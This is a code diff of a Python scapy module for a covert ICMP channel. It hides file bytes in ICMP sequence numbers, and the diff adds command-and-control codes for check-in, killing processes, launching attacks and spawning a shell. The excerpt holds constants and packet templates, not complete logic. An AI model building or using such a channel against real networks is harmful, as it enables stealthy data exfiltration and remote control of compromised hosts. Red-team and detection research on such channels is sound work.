@@ -1,24 +1,36 @@
-from scapy.all import ICMP, IP, sr
+from scapy.all import ICMP
 import hashlib
 
 control_identifier = 0  # when the ID field is 0x00 the sequence contains a control code. Otherwise it contains bytes from a file.
 
+control_codes = {
+    "START_TRANSMISSION": 0,
+    "STOP_TRANSMISSION": 1,
+    "START_FILENAME": 2,
+    "STOP_FILENAME": 3,
+    "NEXT_CHUNK": 4,
+    "START_VERIFY": 5,
+    "STOP_VERIFY": 6,
+    "C2_CHECK_IN": 7,
+}
 
-class icmpExfil:
+# when running in C2 mode the controller may respond with a different seq number than the original ICMP packet it received. That control code tells the agent what to do next.
+c2_actions = {
+    "DO_NOTHING": 0,
+    "KILL_PROCESS": 1,
+    "LAUNCH_ATTACK": 2,
+    "SPAWN_SHELL": 3,
+}
+
+
+class absurdIcmp:
 
     control_identifier = control_identifier
     low_identifier = 1
     max_id = 65535  # max sequence number (2^16 - 1)
 
-    control_codes = {
-        "START_TRANSMISSION": 0,
-        "STOP_TRANSMISSION": 1,
-        "START_FILENAME": 2,
-        "STOP_FILENAME": 3,
-        "NEXT_CHUNK": 4,
-        "START_VERIFY": 5,
-        "STOP_VERIFY": 6,
-    }
+    control_codes = control_codes
+    c2_actions = c2_actions
 
     start_icmp = ICMP(id=control_identifier, seq=control_codes["START_TRANSMISSION"])
     stop_icmp = ICMP(id=control_identifier, seq=control_codes["STOP_TRANSMISSION"])
